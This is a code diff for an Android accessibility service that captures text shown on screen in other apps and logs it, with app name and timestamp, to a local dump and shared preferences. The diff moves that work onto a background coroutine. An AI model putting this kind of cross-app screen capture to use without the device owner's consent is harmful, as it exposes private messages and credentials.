@@ -175,35 +175,37 @@ class MyAccessibilityService : AccessibilityService() {
         if (textContent.isNotEmpty()) {
             val pm = packageManager
             val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
-            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-            
-            val historyStr = prefs.getString("text_history_by_app", "{}")
-            val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
-            val appArray = rootJson.optJSONArray(appName) ?: JSONArray()
-
             val newTxt = textContent.take(100).toString()
-            val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
             
-            if (newTxt != lastTxt) {
-                nextAllowedCheck = now + 500
-                
-                // 1. STREAM LOGGING (NO LAG)
-                val entry = JSONObject()
-                entry.put("pkg", appName)
-                entry.put("ts", now)
-                entry.put("txt", newTxt)
-                DumpManager.appendLog("SCREEN", entry)
-                
-                // 2. Update Stats
-                prefs.edit()
-                    .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
-                    .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
-                    .apply()
+            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                val historyStr = prefs.getString("text_history_by_app", "{}")
+                val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
+                val appArray = rootJson.optJSONArray(appName) ?: JSONArray()
 
-                // 3. Verify
-                DumpManager.logVerification("READER", pkgName)
-            } else {
-                nextAllowedCheck = now + 3000
+                val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
+                
+                if (newTxt != lastTxt) {
+                    nextAllowedCheck = System.currentTimeMillis() + 500
+                    
+                    // 1. STREAM LOGGING (NO LAG)
+                    val entry = JSONObject()
+                    entry.put("pkg", appName)
+                    entry.put("ts", System.currentTimeMillis())
+                    entry.put("txt", newTxt)
+                    DumpManager.appendLog("SCREEN", entry)
+                    
+                    // 2. Update Stats (Using commit() to bypass QueuedWork ANR)
+                    prefs.edit()
+                        .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
+                        .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
+                        .commit()
+
+                    // 3. Verify
+                    DumpManager.logVerification("READER", pkgName)
+                } else {
+                    nextAllowedCheck = System.currentTimeMillis() + 3000
+                }
             }
         }
     }
